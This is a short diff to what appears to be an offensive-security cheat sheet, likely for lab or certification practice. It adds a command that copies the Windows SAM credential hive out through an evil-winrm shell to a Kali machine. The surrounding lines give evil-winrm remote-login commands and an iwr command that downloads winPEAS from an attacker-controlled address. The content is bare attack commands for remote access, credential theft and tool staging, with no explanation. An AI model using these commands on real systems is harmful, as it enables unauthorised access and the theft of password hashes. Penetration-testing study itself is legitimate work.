@@ -54,6 +54,8 @@
 - ``` evil-winrm -i {ip} -u {username not service name} -p "{password}" ```
 ### evil-winrm (Secured)
 - ``` evil-winrm -S -i {host} -c {key.cert} -k {key.pem} ```
+### Download file thru this shell
+- ``` download C:\windows.old\Windows\System32\SAM /home/kali/SAM ```
 
 ### Winpeas (may be info not correct)
 - Get file from remote ``` iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe ```
